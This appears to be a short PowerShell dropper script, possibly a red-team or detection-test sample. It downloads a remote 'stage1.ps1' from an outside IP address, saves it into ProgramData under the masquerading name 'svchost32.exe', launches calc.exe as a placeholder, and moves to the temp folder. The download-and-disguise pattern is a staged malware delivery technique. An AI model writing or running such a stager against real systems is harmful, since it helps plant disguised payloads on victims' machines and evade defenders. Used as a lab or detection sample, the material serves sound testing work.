[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://203.0.113.150/stage1.ps1',
    [string]$DownloadPath = "C:\ProgramData\svchost32.exe",
    [int]$TimeoutSec = 85
)
Invoke-WebRequest -Uri $FetchUrl -OutFile $DownloadPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Set-Location -Path $env:TEMP
